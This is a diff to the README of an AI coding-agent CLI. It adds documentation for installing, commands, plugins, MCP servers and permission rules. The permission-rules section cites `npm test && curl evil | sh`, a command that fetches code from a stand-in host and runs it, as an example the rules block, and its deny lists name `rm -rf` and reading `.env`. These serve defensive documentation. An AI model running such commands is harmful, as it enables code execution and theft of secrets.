@@ -21,7 +21,8 @@ tools — see [Limits](#limits).)
 - [A new project](#a-new-project)
 - [Modes](#modes)
 - [Choosing agents and models](#choosing-agents-and-models)
-- [Commands inside a session](#commands-inside-a-session)
+- [Commands inside a session](#commands-inside-a-session) · [Custom commands and plugins](#custom-commands-and-plugins)
+- [Code review and GitHub](#code-review-and-github)
 - [Tools](#tools)
 - [Computer use](#computer-use)
 - [Safety](#safety)
@@ -157,6 +158,31 @@ The design is in `docs/ARCHITECTURE.md`; the tool layer is its §5a and §5b.
 
 ## Install
 
+Prebuilt `incode` (and `sbx`, the [standalone sandbox](crates/sandbox)) for
+Linux (x86_64, aarch64; glibc), macOS (Intel, Apple silicon) and Windows
+(x86_64) are published on each GitHub release. The install scripts fetch the
+latest one, check it against the release's `SHA256SUMS`, and install it:
+
+```sh
+# Linux / macOS — into ~/.local/bin (or $INCODE_INSTALL_DIR)
+curl -fsSL https://raw.githubusercontent.com/incordai/incode/main/scripts/install.sh | sh
+```
+
+```powershell
+# Windows — into %LOCALAPPDATA%\incode\bin, added to your user PATH
+irm https://raw.githubusercontent.com/incordai/incode/main/scripts/install.ps1 | iex
+```
+
+Set `INCODE_VERSION=v0.2.0` to pin a release instead of the latest. Once
+installed, `incode update --check` says whether a newer release exists, and
+`incode update` installs it in place (sha256-checked; `sbx` is updated too when
+it sits beside `incode`). The Linux binary is built with the default
+`desktop-capture` feature, so it needs the shared libraries of the capture
+stack (`libgbm`, `libwayland-client`, `libxcb`) present at run time; on a
+server without them, build from source without that feature.
+
+### From source
+
 ```sh
 git clone <this repo> incord-code
 cd incord-code
@@ -172,6 +198,18 @@ install -m755 target/release/incode ~/.local/bin/incode
 # Windows (PowerShell)
 Copy-Item target\release\incode.exe $env:USERPROFILE\.local\bin\
 ```
+
+**On Windows, also set up the sandbox** (`sbx`, which runs inside WSL2):
+
+```powershell
+powershell -ExecutionPolicy Bypass -File scripts\install-windows.ps1
+```
+
+It installs WSL2 if it's missing (asks first; needs administrator rights
+once and usually a restart, then run it again). It then builds `sbx` inside
+WSL2 and puts `sbx.exe` on your PATH. `sbx.exe` forwards every command into
+WSL2, where the Linux sandbox confines it. macOS and Linux need no extra
+step.
 
 Each Outline language is a default cargo feature (`lang-rust`, `lang-ts`,
 `lang-python`, `lang-go`, `lang-js`); build with `--no-default-features` and a
@@ -260,6 +298,7 @@ agreeing what "done" means.
 | `incode --admin` | Print the resolved settings and which layer decided each. |
 | `incode --desktop-stop` | Halt the desktop driving this workspace. |
 | `incode --install-tools` | Download, check and unpack every [external tool](#external-tools) in `admin.json`, then exit (non-zero if any was not installed). |
+| `incode update [--check]` | Install the latest release over this program, checked against its `SHA256SUMS` (see [Install](#install)); `--check` only reports whether there is one. |
 | `incode --tool-server` | Internal. Started by the agent CLI that incode launched; offers incode's tools over MCP and runs nothing itself. |
 | `incode --desktop-mcp` | Internal. The desktop tools' executor, started by incode's toolbox. |
 | `incode --team-mcp --team-channel <p>` | Internal. The team channel as an MCP server, for `codex`. |
@@ -380,6 +419,12 @@ a vendor is built into incode: these are ordinary entries you write.
   service that refuses the field.
 - `api_version`: the `anthropic-version` header the `anthropic` format sends.
   Unset, `2023-06-01`, the value that format documents.
+- `context_window` (tokens, default 200000; 0 never compacts on its own): an
+  API route's conversation lives in incode, so incode keeps it inside the
+  window. Past 80% of it, the older turns are summarised by the same model into
+  one message and the last two turns are kept verbatim (a tool call is never
+  parted from its result). `/compact [instructions]` does it now, steered by
+  what you ask the summary to keep. A CLI agent compacts its own transcript.
 - `/model <id>` switches to any model the service offers; `/models` lists them.
 
 ### CLI agents
@@ -439,11 +484,14 @@ it sets; any other `id` adds an agent.
 | `/run` | Work the roadmap ledger until it is empty or something needs a person |
 | `/roadmap` | What the roadmap says, and which goals a command has proven |
 | `/guards` | The paths the agent is not allowed to write |
+| `/permissions` | The allow / ask / deny [permission rules](#permission-rules) in force, and where each came from |
 | `/links <file>` | What else uses what this file defines, and what it depends on |
 | `/undo` | Put the files from the last changed turn back |
 | `/rewind <n>` | Put the files back as they were n changed turns ago |
 | `/diff [file] [rev]` | Unified diff of a file or the workspace against older code |
 | `/plan` · `/act` | Read-only mode · workspace-write mode |
+| `/review [base]` | Review the change against `base` (default: where the branch forked from origin's default branch) — see [below](#code-review-and-github) |
+| `/compact [instructions]` | Summarise the older turns now (API route); a CLI agent compacts its own |
 | `/image <path>` | Send a PNG or JPEG with the next message |
 | `/clear` · `/save` · `/sessions` · `/resume <id>` | Session handling |
 | `/remember <text>` · `/memories <query>` · `/forget <ref> [confirm]` | The shared long-term memory |
@@ -454,8 +502,102 @@ it sets; any other `id` adds an agent.
 | `/pr merge [branch] [--squash\|--rebase]` | Merge that branch's open pull request (a merge commit by default; the branch is kept). Only as reviewed: refused for a draft, a conflict, a failing or still-running check, or when the PR's head is not your local branch's tip — and GitHub is told that head, so nothing pushed afterwards can ride along. Says so when no checks ran at all |
 | `/add-dir <path>` | Also work in this directory — guards and undo extend to it too |
 | `/tools add <name>` · `/tools update [name]` · `/tools remove <name>` | Install, update or remove an [external tool](#external-tools) (also over `--acp`) |
-| `/tools` · `/mcp` · `/env` · `/compact` | Information screens (`/tools` also lists the external tools and what is installed) |
+| `/tools` · `/mcp` · `/env` | Information screens (`/tools` also lists the external tools and what is installed) |
+| `/cost` | Input, output and cache tokens per model this session, with an estimated USD figure from list prices |
+| `/vim` | Toggle vi editing in the input box for this session |
 | `/quit` | Exit |
+
+### Notifications, status line, vi mode and key bindings
+
+All optional, in `~/.incode/admin.json`:
+
+```json
+{
+  "notify": "auto",
+  "notify_command": "say \"$INCODE_MESSAGE\"",
+  "notify_after_secs": 10,
+  "statusline_command": "~/.incode/statusline.sh",
+  "editing_mode": "vi"
+}
+```
+
+- **`notify`** — when a turn that ran longer than `notify_after_secs` (default 10) finishes, or the agent stops to ask for permission or an answer: `auto` (default) sends an OSC 9 notification on terminals known to show one (iTerm2, WezTerm, Windows Terminal, kitty, Ghostty) and a bell elsewhere; `bell`; `desktop` (`notify-send` on Linux, `osascript` on macOS, a BurntToast or WinRT toast through PowerShell on Windows, a bell when that cannot start); `off`. `notify_command` also runs, with `INCODE_EVENT` (`done` or `input`) and `INCODE_MESSAGE` set. Nothing waits on either.
+- **`statusline_command`** — run at start and after each turn with the session as JSON on stdin (`cwd`, `workspace`, `model`, `session_id`, `git_branch`, `git_dirty`, `tokens` {`input`, `output`, `cache_write`, `cache_read`, `total`}, `cost_usd`, null when a model is unpriced). Its first line replaces the facts on the input box's top rule. It gets 1.5 s; a slow or failing run keeps the last good line.
+- **`editing_mode`** — `emacs` (default) or `vi`. In vi mode Esc enters normal mode (`h l w b e 0 ^ $ x X D C s S dd cc i a I A j k`) and Enter submits from either mode.
+- **`~/.incode/keybindings.toml`** — flat `"key" = "action"` lines, checked before the built-in keys. Keys: `ctrl-`, `alt-`, `shift-` plus a character, `enter`, `tab`, `esc`, `backspace`, `delete`, arrows, `home`, `end`, `space`, `f1`–`f12`. Actions: `clear-line`, `kill-to-start`, `kill-to-end`, `delete-word`, `line-start`, `line-end`, `char-left`, `char-right`, `word-left`, `word-right`, `history-prev`, `history-next`, `newline`, `submit`, `complete`.
+
+  ```toml
+  "ctrl-l" = "clear-line"
+  "alt-b" = "word-left"
+  "alt-f" = "word-right"
+  ```
+
+Prices for `/cost`, the status line and `-t --output-format json` (`cost_usd`) are one table, `PRICES` in `src/runtime/usage.rs`; a model it does not know is shown as unpriced, never guessed.
+
+## Code review and GitHub
+
+`incode review` (and `/review` in a session) hands the model the change and
+one job: report correctness bugs first, then security problems, then
+simplifications, each cited as `path:line` — or say "No issues found."
+
+```sh
+incode review                     # the branch since it forked from origin's default branch, plus uncommitted and untracked work
+incode review --base v0.3.0       # against any ref
+incode review -p > review.md      # findings only on stdout; progress on stderr
+```
+
+The same machinery runs in CI: [`.github/actions/incode`](.github/actions/incode/action.yml)
+answers `@incode` mentions on issues and pull requests (posting the reply and
+pushing any change to a new branch), or reviews each pull request as it opens.
+Setup, inputs and the safety defaults are in
+[docs/github-action.md](docs/github-action.md).
+
+## Custom commands and plugins
+
+A markdown file is a slash command. Put it in `.incode/commands/` (the
+project's) or `~/.incode/commands/` (yours; the project's wins on a name
+clash). The name is the path with `/` turned into `:` — `frontend/test.md` is
+`/frontend:test`. Built-in commands always win, and a file that shadows one is
+reported at start.
+
+```markdown
+---
+description: Run the frontend tests for one file
+argument-hint: <file> [pattern]
+model: sonnet
+allowed-tools: Bash(npm test:*), Read
+---
+Run the tests in $1, filtered to `$2`. Everything typed: $ARGUMENTS
+```
+
+`$ARGUMENTS` is everything after the name; `$1`..`$9` are its words, split like
+a shell (quotes group). A body with neither gets the arguments appended. Typing
+`/frontend:test app.tsx` sends the filled-in text as your turn, and `incode -t
+"/frontend:test app.tsx"` runs it headless. Custom commands are listed in
+`/help` and complete on Tab. `model` is used by `-t` when `-m` is not given; in
+the REPL it is only named, since switching models starts the conversation over.
+`allowed-tools` is advisory: shown, not enforced — guards, the permission mode
+and hooks are what restrict tools.
+
+A **plugin** is a folder in `~/.incode/plugins/<name>/` or
+`.incode/plugins/<name>/` with a `plugin.toml` (`name`, `version`,
+`description`) and any of: `commands/**/*.md` (as `/<plugin>:<cmd>`),
+`skills/<skill>/SKILL.md` (listed in `/skills` as `<plugin>:<skill>`),
+`hooks.json` (`{"pre_tool_use": [...], "post_tool_use": [...]}`, added to
+`admin.json`'s hooks) and `.mcp.json` (`{"mcpServers": {"db": {"command",
+"args", "env"}}}`, or `{"type": "http", "url", "headers"}`, started with the
+session). `${INCODE_PLUGIN_ROOT}` in a hook or server is the plugin's folder.
+
+```sh
+incode plugin list
+incode plugin add https://github.com/you/incode-web-plugin   # git clone --depth 1
+incode plugin add ./my-plugin --project                      # copied into .incode/plugins/
+incode plugin remove web
+```
+
+A plugin's hooks and servers run with your authority; install only what you
+would run yourself. Skills and hooks are read for the directory incode was
+started in.
 
 ## Tools
 
@@ -579,6 +721,47 @@ memory engine cannot decide). A tool with `"provides": "browser"` is also the
 browser incode's own `Screenshot`, `RenderPdf` and `WebFetch` `render_js` use.
 Its tools join the session after it starts; a tool installed during a session
 is offered from the next one.
+
+### MCP servers
+
+incode starts the MCP servers named in a project's `.mcp.json` and in your
+`~/.incode/mcp.json` — the format other agents use — and offers their tools as
+`mcp__<server>__<tool>`, through the same gate as every other tool:
+
+```json
+{ "mcpServers": {
+    "github": { "command": "npx", "args": ["-y", "@modelcontextprotocol/server-github"],
+                "env": { "GITHUB_TOKEN": "${GITHUB_TOKEN}" } },
+    "docs":   { "type": "http", "url": "https://mcp.example.com/mcp",
+                "headers": { "Authorization": "Bearer ${DOCS_TOKEN:-}" } } } }
+```
+
+- `${VAR}` and `${VAR:-default}` are expanded from the environment in
+  `command`, `args`, `env`, `url` and `headers`; an unset variable with no
+  default stops that server and names the variable.
+- `http` servers speak MCP Streamable HTTP (https anywhere, plain http only to
+  this machine). `sse` is tried the same way; a server that speaks only the
+  legacy SSE transport will not connect. OAuth is not supported yet — pass a
+  token in `headers`.
+- **A project's server is asked about before it first runs**, because a
+  `git clone` can bring one. The REPL asks; approvals are remembered in
+  `~/.incode/mcp-approvals.json`, keyed by the server's name and a sha256 of
+  its type, command, args, env, url and headers as written — change any of
+  them and it is asked about again. Under `-t` and `--acp` an unapproved
+  server is skipped with the command that approves it. Your own
+  `~/.incode/mcp.json` needs no approval.
+
+```sh
+incode mcp list                       # every server, its scope and status
+incode mcp get <name>
+incode mcp add fs -- npx -y @modelcontextprotocol/server-filesystem .
+incode mcp add -s project -H 'Authorization: Bearer ${T}' docs https://mcp.example.com/mcp
+incode mcp remove [-s user|project] <name>
+incode mcp approve <name>             # approve a project server as it is written now
+```
+
+`add` writes `~/.incode/mcp.json` unless given `-s project`; a project server
+added this way is approved as written.
 
 ## Computer use
 
@@ -760,6 +943,65 @@ sbx run -w . -w ~/.claude -w ~/.claude.json -w ~/.incode --wall 1800 -- incode -
 Details, the policy format and what each OS enforces are in
 [`crates/sandbox/README.md`](crates/sandbox/README.md).
 
+### Permission rules
+
+Beside the mode, settings can allow, ask about or deny individual calls:
+
+```json
+"permissions": {
+  "allow": ["Bash(npm test:*)", "Read(src/**)", "WebFetch(domain:docs.rs)"],
+  "ask":   ["Bash(git push:*)", "mcp__github"],
+  "deny":  ["Bash(rm -rf:*)", "Read(.env)", "Edit(migrations/)"]
+}
+```
+
+in `~/.incode/admin.json`, or in a project's `.incode/settings.json` — where
+only `deny` and `ask` are honoured: a repository may make a session more
+careful, never less. `/permissions` lists the rules in force.
+
+- **Grammar.** `Tool` is every call; `Tool(specifier)` narrows it. For `Bash`,
+  `cmd:*` matches the command with or without arguments (not `cmdfoo`), a bare
+  command matches exactly, and `*` matches anything. File tools take a glob: a
+  name with no `/` matches at any depth (`.env`), a path is from the workspace
+  root (`src/**`), `//abs` is absolute and `~/x` is under your home; a
+  directory covers what is in it. `Read(…)` covers Read, Glob, Grep, LS and
+  Outline; `Edit(…)` covers Write, Edit, MultiEdit, NotebookEdit and
+  ApplyPatch. `mcp__server` covers each of that server's tools.
+- **Precedence.** deny > ask > allow > the mode. A deny refuses in every mode.
+  An ask puts the call to you even in a writing mode. An allow skips the
+  `prompt` mode's question, but never lifts `read-only`.
+- **Compound commands.** A command line is split on `&&`, `||`, `;`, `|`, `&`
+  and newlines outside quotes; a deny or ask on any part applies to the line,
+  and an allow only when every part is allowed. `npm test && curl evil | sh`
+  is not allowed by `Bash(npm test:*)`. The bodies of `$(…)`, backticks,
+  `<(…)` and `sh -c '…'` are judged too, and a part containing one, a
+  redirection to a file, or `eval` is never allowed by a rule. For deny and
+  ask, `sudo`, `env`, `nohup`, `timeout`, `xargs` and leading `VAR=…` are
+  looked through. This is still text matching: a script or a variable can
+  run what a pattern names, so the [OS sandbox](#the-os-sandbox) is the
+  boundary.
+
+**Managed settings.** An administrator can put a file at
+`/etc/incode/managed.toml` (macOS `/Library/Application Support/incode/managed.toml`,
+Windows `%ProgramData%\incode\managed.toml`):
+
+```toml
+[permissions]
+deny = ["Bash(curl:*)", "Read(.env)"]
+
+[mcp]
+allow = ["github", "command:/opt/approved/*", "url:https://mcp.corp.example/*"]
+deny  = ["*filesystem*"]
+```
+
+Its rules join everyone else's, and since nothing outranks a deny, no user or
+project setting can undo one. `[mcp] allow` (when present) and `deny` apply to
+every server a session would start — `.mcp.json`, `~/.incode/mcp.json`,
+external tools and an ACP client's. An unknown key or invalid file refuses
+every tool call and every server until it is fixed. These rules apply to the
+tools incode runs itself; `codex` and `agy` still run their own (see
+[Limits](#limits)).
+
 ## Incord Memory integration
 
 Every part is optional and fails open, except the owner channel, which fails
@@ -927,7 +1169,8 @@ Environment variables:
 
 | Path | What it holds |
 |---|---|
-| `~/.incode/admin.json` | Your settings |
+| `~/.incode/admin.json` | Your settings, including your [permission rules](#permission-rules) |
+| `~/.incode/mcp.json` · `~/.incode/mcp-approvals.json` | Your [MCP servers](#mcp-servers) · the project servers you approved |
 | `~/.incode/agents/*.md` | Your sub-agents, for every project |
 | `~/.incode/sessions/<workspace>.json` | Session pointers, so a conversation can be reopened |
 | `~/.incode/history.txt` | The lines you typed |
@@ -935,6 +1178,8 @@ Environment variables:
 | `<project>/.incode/ledger.json` | What is being worked on in *this* checkout |
 | `<project>/.incode/contracts.json` | Interfaces frozen before the work was split up |
 | `<project>/.incode/guards.json` | Extra protected paths for this project |
+| `<project>/.incode/settings.json` | The project's `deny` / `ask` permission rules |
+| `<project>/.mcp.json` | The project's MCP servers (asked about before each first runs) |
 | `<project>/.incode/agents/*.md` | The project's sub-agents |
 | `<project>/.incode/checkpoints/<session>/` | Each turn's "before", for `/undo` and `/rewind` |
 | `<project>/.incode/transcripts/` · `.incode/context/` | Session transcripts · oversized memory blocks |
@@ -943,8 +1188,8 @@ Environment variables:
 | `<project>/.incode/.gitignore` | Which of the above is this machine's own and is not committed |
 
 Per-project state lives **in the project**; `~/.incode` is yours. Of the
-project's `.incode/`, commit `contracts.json`, `guards.json`, `agents/*.md` and
-`.gitignore`; the `.gitignore` incode writes keeps the rest out.
+project's `.incode/`, commit `contracts.json`, `guards.json`, `settings.json`,
+`agents/*.md` and `.gitignore`; the `.gitignore` incode writes keeps the rest out.
 
 Task transcripts used to be written into `.incode/agents/`, beside the
 sub-agent definitions; each start moves any `*.jsonl` found there to
